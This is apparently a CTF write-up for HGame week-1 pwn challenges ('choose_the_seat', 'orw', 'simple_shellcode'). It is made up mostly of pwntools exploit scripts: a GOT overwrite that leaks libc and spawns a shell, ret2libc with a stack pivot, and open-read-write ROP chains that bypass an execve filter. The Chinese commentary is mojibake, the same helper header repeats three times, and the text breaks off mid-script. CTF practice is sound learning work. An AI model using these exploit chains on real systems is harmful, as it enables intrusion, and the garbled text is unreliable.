0x18 backdoor = 0x401176 ret = 0x000000000040101a payload = flat({offset:[ ret, backdoor ]}) sendline_after_clean(payload) interactive_after_clean() choose_the_seat checksec ida éå¸¸æ˜æ˜¾åœ°ï¼Œè¾“å…¥è´Ÿæ•°å¯ä»¥æ›´æ”¹seatsä¸Šæ–¹çš„ä»»æ„æ•°æ®\næˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¿®æ”¹gotè¡¨ï¼Œç›®æ ‡æ˜¯æŠŠputsçš„gotå€¼æ”¹æˆsystemçš„åœ°å€ï¼Œä½†è¿™é¦–å…ˆéœ€è¦æ³„éœ²libcï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æŠŠexitçš„gotå€¼æ”¹æˆmainå‡½æ•°çš„åœ°å€ï¼Œç„¶åå°±å¯ä»¥æ“ä½œå¤šæ¬¡ï¼Œå°±å¯ä»¥æ³„éœ²libcåæ›´æ”¹putsçš„got\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-choose_the_seat\u0026#34; libc_name: str = \u0026#34;libc-2.31.so\u0026#34; port: str = \u0026#34;31653\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean(b\u0026#34;-6\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(pg(0x4011D6)) sendline_after_clean(b\u0026#34;-9\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(b\u0026#34;1\u0026#34;*7+b\u0026#34;.\u0026#34;, \u0026#34;please input your name\\n\u0026#34;) puts_addr = recv_and_transform(b\u0026#34;.\u0026#34;) base_addr = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one_gadget = base_addr + 0xe3afe suclog( base_addr=base_addr ) sendline_after_clean(b\u0026#34;-9\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34; + pg(system_addr), \u0026#34;please input your name\\n\u0026#34;) interactive_after_clean() orw checksec ida ç¨‹åºç¦æ‰äº†execveå’Œexecveatï¼š\nå› ä¸ºåç§»é‡æ˜¯0x108ï¼Œèƒ½è¾“å…¥0x130ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åªèƒ½æ‰§è¡Œäº”æ¡æŒ‡ä»¤ï¼š\næ³•ä¸€ï¼šret2libcåæ ˆè¿ç§» å› ä¸ºåŸæ¥çš„ç©ºé—´ä¸å¤Ÿï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æ ˆè¿ç§»åˆ°bss_end + 0x100çš„åœ°æ–¹ï¼Œç„¶åå°±å¯ä»¥éšä¾¿orwäº†\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-orw\u0026#34; libc_name:str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30527\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break vuln c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # æŸ¥æ‰¾gadgetçš„å†…ç½®å‡½æ•° rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] suclog( pop_rdi_ret=pop_rdi_ret, ret=ret ) #éœ€è¦è‡ªè¡Œè®¾å®šoffset offset:int = 0x108 # éœ€è¦æ”¹ä¸ºéœ€è¦çš„è¾“å…¥å‡½æ•°ï¼Œé»˜è®¤ä¸ºputs puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] vuln_addr: int = m_elf.sym[\u0026#34;vuln\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, vuln_addr=vuln_addr ) # å‘é€payload payload = flat({offset:[ pop_rdi_ret, puts_got, puts_plt, vuln_addr ]}) sendline_after_clean(payload) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = recv_and_transform() # è®¡ç®—å¾—åˆ°åŸºå€å’Œsystemåœ°å€ base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] open_addr: int = base_addr + libc.sym[\u0026#39;open\u0026#39;] read_addr: int = base_addr + libc.sym[\u0026#39;read\u0026#39;] # puts_addr: int = base_addr + libc.sym[\u0026#39;puts\u0026#39;] pop_rdi: int = base_addr + 0x0000000000023b6a pop_rsi: int = base_addr + 0x2601f pop_rdx: int = base_addr + 0x142c92 fake_stack = 0x404060 + 0x200 flag = fake_stack flag_content = 0x404060 + 0x300 leave_ret = 0x00000000004012be suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, open_addr=open_addr, read_addr=read_addr, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx, ) # æ³¨æ„æ ˆå¯¹é½ payload = flat({offset-8:[ fake_stack, pop_rsi, fake_stack, read_addr, leave_ret ]}) sendline_after_clean(payload) payload = flat([ \u0026#34;./flag\\x00\\x00\u0026#34;, pop_rdi, flag, pop_rsi, 0, open_addr, pop_rdi, 3, pop_rsi, flag_content, pop_rdx, 0xff, read_addr, pop_rdi, flag_content, puts_addr, ]) sendline_after_clean(payload) interactive_after_clean() æ³•äºŒï¼šret2libcåæ›´æ”¹rdxé‡æ–°read æˆ‘ä»¬åœ¨ret2libcåå¯ä»¥è€ƒè™‘æ›´æ”¹rdxå†è¿”å›åˆ°vuln+0x1Eå¤„ï¼š\nç„¶åå°±èƒ½æ ˆæº¢å‡ºä»»æ„é•¿å­—èŠ‚äº†\nç„¶åæˆ‘ä»¬å†ç”¨readæŠŠ\u0026quot;flag\u0026quot;è¯»å…¥ä¸€ä¸ªå¯å†™çš„åœ°å€å¤„ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½orwå¾—åˆ°flagäº†\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-orw\u0026#34; libc_name:str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30527\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break vuln c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # æŸ¥æ‰¾gadgetçš„å†…ç½®å‡½æ•° rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] suclog( pop_rdi_ret=pop_rdi_ret, ret=ret ) #éœ€è¦è‡ªè¡Œè®¾å®šoffset offset:int = 0x108 # éœ€è¦æ”¹ä¸ºéœ€è¦çš„è¾“å…¥å‡½æ•°ï¼Œé»˜è®¤ä¸ºputs puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] vuln_addr: int = m_elf.sym[\u0026#34;vuln\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, vuln_addr=vuln_addr ) # å‘é€payload payload = flat({offset:[ pop_rdi_ret, puts_got, puts_plt, vuln_addr ]}) sendline_after_clean(payload) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = recv_and_transform() # è®¡ç®—å¾—åˆ°åŸºå€å’Œsystemåœ°å€ base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] open_addr: int = base_addr + libc.sym[\u0026#39;open\u0026#39;] read_addr: int = base_addr + libc.sym[\u0026#39;read\u0026#39;] # puts_addr: int = base_addr + libc.sym[\u0026#39;puts\u0026#39;] pop_rdi: int = base_addr + 0x0000000000023b6a pop_rsi: int = base_addr + 0x2601f pop_rdx: int = base_addr + 0x142c92 fake_stack = 0x404060 + 0x200 flag = fake_stack flag_content = 0x404060 + 0x300 leave_ret = 0x00000000004012be suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, open_addr=open_addr, read_addr=read_addr, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx, ) payload = flat({offset:[ pop_rdx, 0xffff, vuln_addr+0x1E ]}) sendline_after_clean(payload) payload = flat({offset:[ pop_rdi, 0, pop_rsi, flag, pop_rdx, 0xff, read_addr, pop_rdi, flag, pop_rsi, 0, pop_rdx, 0, open_addr, pop_rdi, 3, pop_rsi, flag_content, pop_rdx, 0xff, read_addr, pop_rdi, flag_content, puts_addr, ]}) sendline_after_clean(payload) sendline_after_clean(b\u0026#34;./flag\\x00\\x00\u0026#34;) interactive_after_clean() simple_shellcode checksec ida ç¨‹åºå…è®¸æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª0x10å­—èŠ‚é•¿çš„shellcodeå¹¶æ‰§è¡Œï¼ŒåŒæ—¶ç¦æ‰äº†execveå’Œexecveatï¼Œç„¶è€Œä¸€èˆ¬çš„orw shellcodeæ˜¯ä¸å¯èƒ½åªæœ‰è¿™ä¹ˆçŸ­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä»ç¨‹åºçš„ä¸Šä¸‹æ–‡å‘ç°æ¼æ´æ‰€åœ¨\næ³•ä¸€ï¼šåˆ©ç”¨callçš„ç‰¹æ€§ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨callçš„ç‰¹æ€§ï¼Œcallä¼šæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€pushè¿›æ ˆä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆä¸­çš„æ•°æ®è·³è½¬åˆ°mainå‡½æ•°çš„ä»»æ„ä½ç½®\næˆ‘ä»¬è·³è½¬åˆ°è¿™é‡Œï¼Œå°±å¯ä»¥readè¿›0xcafe0000ä¸ªå­—èŠ‚ï¼š\nç„¶åæˆ‘ä»¬å°±å¯ä»¥è¾“å…¥orwçš„shellcodeè¿›è¡Œè¯»å†™äº†ï¼š\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-simple_shellcode\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30295\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x13BB) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is 